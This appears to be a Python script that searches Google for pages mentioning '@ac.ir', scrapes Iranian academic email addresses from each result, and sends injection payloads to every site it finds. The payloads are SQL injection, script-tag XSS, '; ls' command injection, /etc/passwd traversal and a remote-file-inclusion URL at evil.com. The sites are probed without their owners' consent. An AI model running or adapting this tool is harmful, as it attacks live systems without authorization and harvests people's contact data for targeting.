import time
import requests
from bs4 import BeautifulSoup
import re
from googlesearch import search

def is_vulnerable(url, test_payloads):
    """
    Simulate basic attack vectors to identify potential vulnerabilities.
    
    :param url: The URL to test.
    :param test_payloads: List of payloads to test for vulnerabilities.
    :return: A dictionary with vulnerability type as key and payloads as values.
    """
    vulnerabilities = {}

    for payload in test_payloads:
        try:
            test_url = f"{url}?q={payload}"
            response = requests.get(test_url, verify=False, timeout=10)

            if response.status_code == 200:
                # Basic check for open redirects
                if response.url != url:
                    vulnerabilities.setdefault('Open Redirect', []).append(payload)

                # Basic XSS Check
                if "<script>" in response.text or "</script>" in response.text:
                    vulnerabilities.setdefault('XSS', []).append(payload)

                # Basic SQL Injection Check
                if "SQL syntax" in response.text or "MySQL" in response.text:
                    vulnerabilities.setdefault('SQL Injection', []).append(payload)

                # Check for Command Injection
                if "command not found" in response.text or "bash: " in response.text:
                    vulnerabilities.setdefault('Command Injection', []).append(payload)

                # Check for Local File Inclusion
                if "file not found" in response.text or "No such file" in response.text:
                    vulnerabilities.setdefault('Local File Inclusion', []).append(payload)

                # Check for Remote File Inclusion
                if "Remote file inclusion" in response.text:
                    vulnerabilities.setdefault('Remote File Inclusion', []).append(payload)

        except requests.RequestException as e:
            print(f"Error testing payload {payload} on {url}: {e}")

    return vulnerabilities


def find_ac_ir_emails_and_vulnerabilities(query, num_results=50):
    emails = set()
    test_payloads = [
        "' OR '1'='1",  # SQL Injection test
        "<script>alert('XSS')</script>",  # XSS test
        "http://malicious.com",  # Open Redirect test
        "; ls",  # Command Injection test
        "../../../../../etc/passwd",  # Local File Inclusion test
        "http://evil.com/malicious_file.php"  # Remote File Inclusion test
    ]

    search_results = set()
    results_fetched = 0
    search_page = 0

    while results_fetched < num_results:
        try:
            # Perform the Google search with pagination
            search_results_page = search(query, start=search_page, stop=search_page+10, pause=2.0)

            for url in search_results_page:
                if url not in search_results:
                    search_results.add(url)
                    results_fetched += 1

                    try:
                        response = requests.get(url, verify=False, timeout=10)
                        time.sleep(2)  # Delay to prevent getting blocked

                        if response.status_code == 200:
                            soup = BeautifulSoup(response.text, 'html.parser')
                            potential_emails = re.findall(
                                r'\b[A-Za-z0-9._%+-]+@[\w.-]*ac\.ir\b', soup.text)

                            emails.update(potential_emails)

                            vulnerabilities = is_vulnerable(url, test_payloads)
                            if vulnerabilities:
                                print(f"\nPotential vulnerabilities found on {url}:")
                                for vuln_type, payloads in vulnerabilities.items():
                                    print(f"  {vuln_type}: {payloads}")

                    except requests.RequestException as e:
                        print(f"Could not process {url}: {e}")

        except Exception as e:
            print(f"Could not process search result page: {e}")

        search_page += 10

    return emails


if __name__ == "__main__":
    search_query = '"@ac.ir"'
    emails = find_ac_ir_emails_and_vulnerabilities(search_query, num_results=50)

    if emails:
        print("\nFound emails:")
        for email in emails:
            print(email)